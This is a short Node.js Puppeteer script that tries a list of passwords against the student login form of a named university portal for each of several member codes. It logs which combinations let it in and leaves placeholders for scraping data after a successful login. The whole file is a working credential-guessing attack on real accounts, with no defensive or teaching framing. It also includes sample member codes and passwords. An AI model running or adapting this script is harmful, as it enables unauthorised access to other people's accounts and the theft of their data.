const puppeteer = require('puppeteer');

async function main() {
  const users = [
    { memberCode: '102105121', password: 'edu.shardsaa' },
    { memberCode: '202105123', password: 'edu.openai' },
    // Add more user objects as needed
  ];

  const passwords = ['password1', 'password2', 'password3'];
  const browser = await puppeteer.launch({ headless: false });

  for (const user of users) {
    for (const password of passwords) {
      const page = await browser.newPage();
      await page.goto('https://webkiosk.thapar.edu/');

      await page.type('[name="MemberCode"]', user.memberCode, { delay: 100 });
      await page.type('[type="password"]', password, { delay: 100 });

      await Promise.all([
        page.waitForNavigation(),
        page.click('#BTNSubmit'),
      ]);

      const profile = await page.$('frame');
      if (profile) {
        console.log(`User ${user.memberCode} successfully logged in with password: ${password}!`);
        // You can perform any necessary actions after successful login
        // For example, scrape data or navigate to other pages
      } else {
        console.log(`User ${user.memberCode} login failed with password: ${password}.`);
      }

      await page.close();
    }
  }

  await browser.close();
}

main().catch(console.error);
